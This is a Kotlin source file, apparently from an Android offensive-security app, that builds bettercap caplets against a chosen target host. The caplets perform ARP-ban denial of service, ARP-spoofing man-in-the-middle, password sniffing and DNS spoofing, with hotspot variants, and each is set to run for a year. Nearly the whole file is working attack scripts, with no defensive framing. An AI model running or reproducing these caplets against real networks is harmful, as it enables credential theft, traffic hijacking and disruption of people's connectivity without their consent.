package org.fsploit.android.data.mitm

import org.fsploit.android.R
import org.fsploit.android.core.ResourceProvider

class BettercapCapletFactory(
    private val resourceProvider: ResourceProvider
) {
    fun buildArpBanCaplet(targetHost: String): String {
        return """
set events.stream.output stdout
set arp.spoof.fullduplex true
set arp.spoof.targets $targetHost
arp.ban on
sleep 31536000
""".trimIndent()
    }

    fun buildArpSpoofCaplet(targetHost: String, gatewayAddress: String): String {
        return """
set events.stream.output stdout
set gateway.address $gatewayAddress
set arp.spoof.fullduplex true
set arp.spoof.targets $targetHost
arp.spoof on
sleep 31536000
""".trimIndent()
    }

    fun buildPasswordSniffCaplet(targetHost: String, gatewayAddress: String): String {
        return """
set events.stream.output stdout
set gateway.address $gatewayAddress
set arp.spoof.fullduplex true
set arp.spoof.targets $targetHost
arp.spoof on
set net.sniff.local false
set net.sniff.verbose false
set net.sniff.filter "host $targetHost and not arp"
net.sniff on
sleep 31536000
""".trimIndent()
    }

    fun buildHotspotPasswordSniffCaplet(targetHost: String): String {
        return """
set events.stream.output stdout
set net.sniff.local false
set net.sniff.verbose false
set net.sniff.filter "host $targetHost and not arp"
net.sniff on
sleep 31536000
""".trimIndent()
    }

    fun buildDnsSpoofCaplet(targetHost: String, gatewayAddress: String, hostsFilePath: String): String {
        return """
set events.stream.output stdout
set gateway.address $gatewayAddress
set arp.spoof.fullduplex true
set arp.spoof.targets $targetHost
arp.spoof on
set dns.spoof.all false
set dns.spoof.hosts ${hostsFilePath}
dns.spoof on
sleep 31536000
""".trimIndent()
    }

    fun buildHotspotDnsSpoofCaplet(targetHost: String, hostsFilePath: String): String {
        return """
set events.stream.output stdout
set net.sniff.local false
set net.sniff.filter "host $targetHost and not arp"
set dns.spoof.all false
set dns.spoof.hosts ${hostsFilePath}
dns.spoof on
sleep 31536000
""".trimIndent()
    }

    fun normalizeDnsRules(rawRules: String): String {
        return rawRules.lineSequence()
            .map { it.trim() }
            .filter { it.isNotEmpty() }
            .joinToString("\n") { line ->
                val tokens = line.split(Regex("\\s+"))
                when {
                    tokens.size >= 3 && tokens[1].equals("A", ignoreCase = true) ->
                        "${tokens[2]} ${tokens[0]}"

                    tokens.size >= 2 ->
                        "${tokens[1]} ${tokens[0]}"

                    else -> throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_filter_rule_invalid, line))
                }
            } + "\n"
    }
}
